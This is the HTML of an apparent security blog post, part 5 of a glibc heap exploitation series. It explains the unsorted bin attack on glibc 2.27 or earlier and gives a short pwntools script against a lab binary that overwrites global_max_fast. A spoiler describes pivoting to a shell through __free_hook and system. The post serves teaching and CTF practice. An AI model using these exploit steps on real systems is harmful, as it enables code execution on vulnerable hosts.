@@ -1,0 +1,178 @@
+<!doctype html>
+<html lang="en" data-mode="dark" data-crt="on">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<script>(function(){try{var d=document.documentElement,m=localStorage.getItem('sf.mode');if(!m)m=matchMedia('(prefers-color-scheme: light)').matches?'light':'dark';d.setAttribute('data-mode',m);if(localStorage.getItem('sf.crt')==='on')d.setAttribute('data-crt','on');}catch(e){}})();</script>
+<title>the unsorted bin attack — algoatson.github.io</title>
+<meta name="description" content="Part 5 — corrupt one freed chunk&#x27;s bk and the next malloc writes a libc pointer to an address you choose. You control WHERE, not WHAT — which sounds useless until you aim it at global_max_fast and unlock the whole fastbin.">
+<meta name="author" content="your name here">
+<link rel="canonical" href="https://algoatson.github.io/p/the-unsorted-bin-attack/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="the unsorted bin attack — algoatson.github.io">
+<meta property="og:description" content="Part 5 — corrupt one freed chunk&#x27;s bk and the next malloc writes a libc pointer to an address you choose. You control WHERE, not WHAT — which sounds useless until you aim it at global_max_fast and unlock the whole fastbin.">
+<meta property="og:url" content="https://algoatson.github.io/p/the-unsorted-bin-attack/">
+<meta property="og:site_name" content="algoatson.github.io">
+<meta property="og:image" content="https://algoatson.github.io/assets/og/the-unsorted-bin-attack.png"><meta name="twitter:card" content="summary_large_image">
+<link rel="icon" type="image/svg+xml" href="/assets/favicon.svg">
+<link rel="alternate" type="application/rss+xml" title="algoatson.github.io" href="/feed.xml">
+<link rel="stylesheet" href="/assets/style.css">
+<link rel="stylesheet" href="/assets/pygments.css">
+<script type="application/ld+json">{"@context": "https://schema.org", "@type": "Article", "headline": "the unsorted bin attack", "datePublished": "2026-06-13", "dateModified": "2026-06-13", "author": {"@type": "Person", "name": "your name here"}, "publisher": {"@type": "Person", "name": "segfault"}, "description": "Part 5 — corrupt one freed chunk's bk and the next malloc writes a libc pointer to an address you choose. You control WHERE, not WHAT — which sounds useless until you aim it at global_max_fast and unlock the whole fastbin.", "url": "https://algoatson.github.io/p/the-unsorted-bin-attack/", "mainEntityOfPage": "https://algoatson.github.io/p/the-unsorted-bin-attack/", "keywords": "heap, pwn, glibc"}</script></head>
+<body>
+<a class="skip" href="#main">skip to content</a>
+<div class="progress" aria-hidden="true"></div>
+<div class="wrap">
+  <div class="frame">
+    <span class="frame__legend"><a href="/">algoatson.github.io</a></span>
+    <span class="frame__addr">~/posts</span>
+
+    <header class="bar">
+      <span class="bar__prompt">&#10095; <b>segfault</b>@algoatson.github.io</span>
+      <nav class="nav" aria-label="primary"><a href="/about/">whoami</a><a href="/" aria-current="page">posts</a><a href="/tags/">tags</a></nav>
+      <button class="searchbtn" data-open="search" type="button">grep<kbd>/</kbd></button>
+    </header>
+
+    <main class="main" id="main">
+<a class="backlink" href="/">back to index</a>
+<header class="posthead">
+  <h1>the unsorted bin attack</h1>
+  <div class="meta"><span>2026-06-13</span><span>4 min read</span><a class="tag" href="/tags/heap/">heap</a> <a class="tag" href="/tags/pwn/">pwn</a> <a class="tag" href="/tags/glibc/">glibc</a></div>
+</header>
+<aside class="series" aria-label="series navigation"><div class="series__head"><span class="series__label">series</span><span class="series__name">glibc heap exploitation</span><span class="series__pos">part 5 of 6</span></div><ol class="series__list"><li><a href="/p/glibc-heap-internals/">the glibc heap, from the chunk up</a></li><li><a href="/p/house-of-force/">the House of Force</a></li><li><a href="/p/fastbin-dup/">fastbin dup</a></li><li><a href="/p/unsafe-unlink/">unsafe unlink (and the safe-unlink bypass)</a></li><li class="cur" aria-current="true">the unsorted bin attack</li><li><a href="/p/tcache-poisoning-explained/">tcache poisoning, explained like you&#x27;ll have to use it</a></li></ol></aside>
+<div class="postwrap has-toc">
+  <aside class="toc" aria-label="table of contents"><span class="toctitle">contents</span><div class="toc">
+<ul>
+<li><a href="#the-write-hiding-in-the-malloc-loop">the write hiding in the malloc loop</a></li>
+<li><a href="#the-value-you-cant-choose">the value you can't choose</a></li>
+<li><a href="#driving-it">driving it</a></li>
+<li><a href="#modern-status">modern status</a></li>
+</ul>
+</div>
+</aside>
+  <article class="prose"><p>Most write primitives let you choose the value. This one doesn't — it always
+writes the <em>same</em> value (a libc pointer), to an address you pick. That asymmetry
+makes it feel useless at first. It isn't: aimed at the right global, "write a huge
+number here" rewrites the rules of the allocator itself.</p>
+<figure class="target"><figcaption><span class="t-label">target</span><span class="t-file">./uba</span></figcaption><div class="target__grid"><dl class="target__facts"><div><dt>arch</dt><dd>amd64-64-little</dd></div><div><dt>libc</dt><dd>2.27  (the unsorted bin attack died in 2.29)</dd></div><div><dt>technique</dt><dd>unsorted-bin scan -&gt; write a libc pointer to a chosen address</dd></div><div><dt>primitive</dt><dd>you control WHERE, not WHAT</dd></div></dl></div></figure>
+<h2 id="the-write-hiding-in-the-malloc-loop">the write hiding in the malloc loop<a class="headerlink" href="#the-write-hiding-in-the-malloc-loop" title="Permanent link">#</a></h2>
+<p>When <code class="highlight">malloc</code> scans the unsorted bin, it pulls the last chunk (<code class="highlight">victim</code>) off the
+list and splices it out with these lines:</p>
+<figure class="codeblock"><figcaption><span class="fname">glibc malloc.c — unsorted bin scan, abridged</span><span class="lang">c</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#glibc-mallocc-unsorted-bin-scan-abridged-1">1</a></span>
+<span class="normal"><a href="#glibc-mallocc-unsorted-bin-scan-abridged-2">2</a></span>
+<span class="normal"><a href="#glibc-mallocc-unsorted-bin-scan-abridged-3">3</a></span>
+<span class="normal"><a href="#glibc-mallocc-unsorted-bin-scan-abridged-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="glibc-mallocc-unsorted-bin-scan-abridged-1"><span class="n">victim</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">unsorted_chunks</span><span class="p">(</span><span class="n">av</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span><span class="w">     </span><span class="c1">// last chunk in the bin</span>
+</span><span id="glibc-mallocc-unsorted-bin-scan-abridged-2"><span class="n">bck</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span><span class="w">                     </span><span class="c1">// the chunk behind it</span>
+</span><span id="glibc-mallocc-unsorted-bin-scan-abridged-3"><span class="hll"><span class="n">unsorted_chunks</span><span class="p">(</span><span class="n">av</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">bk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bck</span><span class="p">;</span><span class="w">        </span><span class="c1">// bin head&#39;s bk -&gt; bck</span>
+</span></span><span id="glibc-mallocc-unsorted-bin-scan-abridged-4"><span class="hll"><span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">unsorted_chunks</span><span class="p">(</span><span class="n">av</span><span class="p">);</span><span class="w">        </span><span class="c1">// *** bck-&gt;fd = &amp;the unsorted bin ***</span>
+</span></span></code></pre></div></td></tr></table></div>
+</figure>
+<p>That last line is the bug. <code class="highlight">bck</code> comes straight from <code class="highlight">victim-&gt;bk</code>, which you
+control if you can corrupt a freed chunk. And <code class="highlight">bck-&gt;fd</code> is <code class="highlight">*(bck + 0x10)</code>. So if
+you set:</p>
+<div class="math math-block"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mrow><mtext>victim</mtext><mrow><mo>&#x02192;</mo></mrow><mtext>bk</mtext><mo>&#x0003D;</mo><mtext>target</mtext><mo>&#x02212;</mo><mn>0</mn><mi>x</mi><mn>10</mn></mrow></math></div>
+<p>then <code class="highlight">bck = target - 0x10</code>, and the allocator writes <code class="highlight">unsorted_chunks(av)</code> — a
+libc address — to <code class="highlight">*(target - 0x10 + 0x10) = *target</code>. One freed chunk, one
+overwritten <code class="highlight">bk</code>, one <code class="highlight">malloc</code>, and <code class="highlight">target</code> now holds a libc pointer:</p>
+<figure class="codeblock hexdump"><figcaption><span class="fname">freed unsorted chunk — bk overwritten to target-0x10</span><span class="lang">hex</span><button class="copy" type="button" aria-label="copy hexdump">copy</button></figcaption><div class="hx"><pre><span class="off">00000000</span>  00 00 00 00 00 00 00 00  91 00 00 00 00 00 00 00  <span class="asc">|................|</span>
+<span class="off">00000010</span>  <mark>60</mark> <mark>87</mark> <mark>ec</mark> <mark>f7</mark> <mark>ff</mark> <mark>7f</mark> <mark>00</mark> <mark>00</mark>  <mark>18</mark> <mark>c0</mark> <mark>60</mark> <mark>00</mark> <mark>00</mark> <mark>00</mark> <mark>00</mark> <mark>00</mark>  <span class="asc">|<mark>`</mark><mark>.</mark><mark>.</mark><mark>.</mark><mark>.</mark><mark>.</mark><mark>.</mark><mark>.</mark><mark>.</mark><mark>.</mark><mark>`</mark><mark>.</mark><mark>.</mark><mark>.</mark><mark>.</mark><mark>.</mark>|</span></pre></div></figure>
+<p>(<code class="highlight">fd</code> left intact pointing into libc; <code class="highlight">bk</code> now points at <code class="highlight">target - 0x10</code>.)</p>
+<h2 id="the-value-you-cant-choose">the value you can't choose<a class="headerlink" href="#the-value-you-cant-choose" title="Permanent link">#</a></h2>
+<p>The thing written is always <code class="highlight">unsorted_chunks(av)</code> = <code class="highlight">&amp;main_arena.bins[0] - 0x10</code>
+— a fixed offset into libc. You can't make it a gadget or a <code class="highlight">/bin/sh</code>. So the
+attack is only useful where <em>a large libc-ish number is enough</em>:</p>
+<ul>
+<li><strong><code class="highlight">global_max_fast</code></strong> — the headline use. It's the cap on what counts as a
+  fastbin-sized chunk. Overwrite it with a giant value and suddenly <em>every</em> size is
+  "fast," so you can run a <a href="/p/fastbin-dup/">fastbin dup</a> on large chunks (and the
+  fastbin's checks are far thinner than the sorted bins'). This is the launch pad
+  for several of the bigger Houses.</li>
+<li><strong>a size / loop bound</strong> — turn a bounded counter into an unbounded one.</li>
+<li><strong><code class="highlight">_IO_list_all</code></strong> — the seed of the House of Orange, where the libc pointer you
+  drop becomes the entry into a forged FILE chain.</li>
+</ul>
+<div class="admonition warning">
+<p class="admonition-title">you just corrupted the bin</p>
+<p>After the write, the unsorted bin's <code class="highlight">bk</code> points at <code class="highlight">target - 0x10</code>, which is
+<em>not</em> a real chunk. The <strong>next</strong> unsorted-bin operation will try to treat it as
+one and likely crash. Do the attack, then immediately use what it bought you
+(e.g. allocate from the now-poisoned fastbin) before touching the unsorted bin
+again.</p>
+</div>
+<h2 id="driving-it">driving it<a class="headerlink" href="#driving-it" title="Permanent link">#</a></h2>
+<figure class="codeblock"><figcaption><span class="fname">uba.py</span><span class="lang">python</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#ubapy-1">1</a></span>
+<span class="normal"><a href="#ubapy-2">2</a></span>
+<span class="normal"><a href="#ubapy-3">3</a></span>
+<span class="normal"><a href="#ubapy-4">4</a></span>
+<span class="normal"><a href="#ubapy-5">5</a></span>
+<span class="normal"><a href="#ubapy-6">6</a></span>
+<span class="normal"><a href="#ubapy-7">7</a></span>
+<span class="normal"><a href="#ubapy-8">8</a></span>
+<span class="normal"><a href="#ubapy-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="ubapy-1"><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+</span><span id="ubapy-2"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./uba&quot;</span><span class="p">);</span> <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./libc.so.6&quot;</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span><span id="ubapy-3"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&quot;main_arena&quot;</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x60</span>     <span class="c1"># from an unsorted-bin leak</span>
+</span><span id="ubapy-4">
+</span><span id="ubapy-5"><span class="n">gmf</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&quot;global_max_fast&quot;</span><span class="p">]</span>
+</span><span id="ubapy-6"><span class="hll"><span class="n">free</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span>                                   <span class="c1"># chunk -&gt; unsorted bin</span>
+</span></span><span id="ubapy-7"><span class="hll"><span class="n">edit</span><span class="p">(</span><span class="n">chunk</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">gmf</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">))</span>         <span class="c1"># fd untouched, bk = &amp;global_max_fast - 0x10</span>
+</span></span><span id="ubapy-8"><span class="n">alloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>                                   <span class="c1"># the scan fires the write: global_max_fast = huge</span>
+</span><span id="ubapy-9"><span class="c1"># every size is &quot;fast&quot; now -&gt; fastbin-dup a 0x400 chunk onto __free_hook, etc.</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<details class="spoiler">
+<summary>where it lands you</summary>
+<p>With <code class="highlight">global_max_fast</code> blown open, a fastbin dup on an arbitrary size drops a
+chunk onto <code class="highlight">__free_hook</code>; set it to <code class="highlight">system</code>, free <code class="highlight">&quot;/bin/sh&quot;</code>:
+<figure class="codeblock"><figcaption><span class="lang">txt</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#code-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="code-1">segfault{wh3r3_n0t_wh4t}
+</span></code></pre></div></td></tr></table></div>
+</figure></p>
+</details>
+<h2 id="modern-status">modern status<a class="headerlink" href="#modern-status" title="Permanent link">#</a></h2>
+<p>glibc 2.29 added an integrity check to the very loop above:</p>
+<figure class="codeblock codeblock--diff"><figcaption><span class="fname">glibc 2.29 — malloc.c</span><span class="lang">diff</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#glibc-229-mallocc-1">1</a></span>
+<span class="normal"><a href="#glibc-229-mallocc-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="glibc-229-mallocc-1"><span class="gi">+  if (__glibc_unlikely (bck-&gt;fd != victim))</span>
+</span><span id="glibc-229-mallocc-2"><span class="gi">+    malloc_printerr (&quot;malloc(): corrupted unsorted chunks 3&quot;);</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<p>Since your forged <code class="highlight">bck</code> (<code class="highlight">target - 0x10</code>) doesn't have an <code class="highlight">fd</code> pointing back at
+<code class="highlight">victim</code>, the check fails and the process aborts. So the unsorted bin attack is a
+<strong><code class="highlight">≤ 2.28</code></strong> move — but its spirit lives on in tcache-era equivalents, and
+<code class="highlight">global_max_fast</code> is still a juicy target whenever you <em>do</em> land an arbitrary
+write.</p>
+<p>That closes the classic bins. Part 6 is the one you'll actually use on a modern
+box: <a href="/p/tcache-poisoning-explained/">tcache poisoning</a> — where the bin barely
+checks anything and a single forged <code class="highlight">fd</code> gives you allocation anywhere.</p></article>
+</div>
+<section class="related"><span class="related__title">related</span><div class="listing"><a class="row" href="/p/unsafe-unlink/"><span class="row__date">2026-06-12</span><span class="row__tag">heap</span><span class="row__title">unsafe unlink (and the safe-unlink bypass)</span><span class="row__min">5 min</span></a><a class="row" href="/p/fastbin-dup/"><span class="row__date">2026-06-11</span><span class="row__tag">heap</span><span class="row__title">fastbin dup</span><span class="row__min">4 min</span></a><a class="row" href="/p/house-of-force/"><span class="row__date">2026-06-09</span><span class="row__tag">heap</span><span class="row__title">the House of Force</span><span class="row__min">4 min</span></a></div></section>
+<nav class="pager"><span></span><a class="next" href="/p/unsafe-unlink/"><span class="lbl">older &#8250;</span>unsafe unlink (and the safe-unlink bypass)</a></nav></main>
+
+    <footer class="status">
+      <span>20 posts</span>
+      <span class="shade">&#9617;&#9618;&#9619;</span>
+      <span>no trackers · no cookies · no js required to read · copying is encouraged</span>
+      <span class="right">
+        <a href="https://github.com/algoatson">github</a><a href="https://twitter.com/yourname">twitter</a><a href="mailto:you@segfault.sh">email</a>
+        <button class="toggle" data-toggle="mode" type="button">[light]</button>
+        <button class="toggle" data-toggle="crt" type="button">[crt]</button>
+        <a href="/feed.xml">[rss]</a>
+      </span>
+    </footer>
+  </div>
+</div>
+
+<div class="palette-mask" role="dialog" aria-modal="true" aria-label="search">
+  <div class="palette">
+    <div class="palette__count">grep<span class="n">0/0</span><span class="rule"></span>posts</div>
+    <div class="palette__input"><span class="sigil">&gt;</span><input type="text"
+       placeholder="fuzzy search title + body…" autocomplete="off" spellcheck="false" aria-label="search query"></div>
+    <div class="palette__results"></div>
+    <div class="palette__hint"><span><kbd>↑↓</kbd>/<kbd>^j ^k</kbd> move</span><span><kbd>⏎</kbd> open</span><span><kbd>esc</kbd> close</span></div>
+  </div>
+</div>
+<div class="help-mask" role="dialog" aria-modal="true" aria-label="keyboard shortcuts">
+  <div class="help"><h3>keys</h3><dl><dt><kbd>/</kbd></dt><dd>search</dd><dt><kbd>j / k</kbd></dt><dd>move / scroll</dd><dt><kbd>enter</kbd></dt><dd>open</dd><dt><kbd>g g / G</kbd></dt><dd>top / bottom</dd><dt><kbd>t</kbd></dt><dd>toggle light</dd><dt><kbd>?</kbd></dt><dd>this help</dd><dt><kbd>esc</kbd></dt><dd>close</dd></dl></div>
+</div>
+<script src="/assets/search-index.js"></script>
+<script src="/assets/app.js" defer></script>
+</body>
+</html>
